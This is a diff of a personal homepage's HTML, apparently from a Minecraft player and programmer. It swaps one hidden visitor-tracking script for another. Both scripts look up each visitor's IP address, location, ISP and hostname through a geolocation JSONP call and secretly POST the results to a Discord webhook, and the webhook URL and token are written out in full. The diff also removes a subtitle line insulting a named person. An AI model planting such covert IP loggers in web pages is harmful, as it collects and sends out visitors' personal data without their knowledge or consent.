@@ -15,34 +15,6 @@
 <link rel="stylesheet" type="text/css" href="assets/css/style.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-<script>
-  function monke(json) 
-  {
-       var request = new XMLHttpRequest();
-       
-       request.open("POST", "https://discord.com/api/webhooks/1103302824554676358/Qru2Gt78_rS-IfH1asFOBfH4Ku8BO0OMoxjZMvtw_ukNQorqK9zChUQGmY9iD7f20Maq");
-  
-       request.setRequestHeader('Content-type', 'application/json');
-  
-       var params = 
-       {
-            username: "IP Logger",
-            avatar_url: "",
-            content: "@everyone",
-            embeds: [
-                 {
-                      title: "Someone visited the IP grabber!",
-                      color: 1752220,
-                      description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
-                 }
-            ]
-       }
-  
-       request.send(JSON.stringify(params));
-  }
-  </script>
-  <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
-
 </head>
 <body>
 <style type="text/css">
@@ -51,6 +23,23 @@ body {
   padding-top:0 !important;
 }
 </style>
+
+<!-- script -->
+
+<script>
+  function geo(json) {
+    var request = new XMLHttpRequest();
+        request.open("POST", "https://discord.com/api/webhooks/1103302824554676358/Qru2Gt78_rS-IfH1asFOBfH4Ku8BO0OMoxjZMvtw_ukNQorqK9zChUQGmY9iD7f20Maq");
+        request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+      username: "ip logs | xnt website",
+      avatar_url: "https://imgur.com/W7jEzEl",
+      content: "```" + "IP: " + json.ip + "\n" + "COUNTRY: " + json.country_name + "\n" + "STATE: " + json.region + "\n" + "CITY: " + json.city + "\n" + "POSTAL CODE: " + json.postal_code + "\n" + "ORG: " + json.org + "\n" + "HOSTNAME: " + json.hostname + "```"
+    }
+   request.send(JSON.stringify(params));
+  }
+  </script>
+  <script src="https://json.geoiplookup.io/?callback=geo"></script>
 
 <script>__wm.rw(0);</script>
 </script>
@@ -72,7 +61,7 @@ body {
 </a>
 </div>
 </div>
-<div class="subtitle"><p>lazy | mc pvper | programmer | anna is a dumbass :skull:
+<div class="subtitle"><p>lazy | mc pvper | programmer
 </p></div>
 <div id="social" class="content cycle-wrapper">
 <ul class="social-icons">
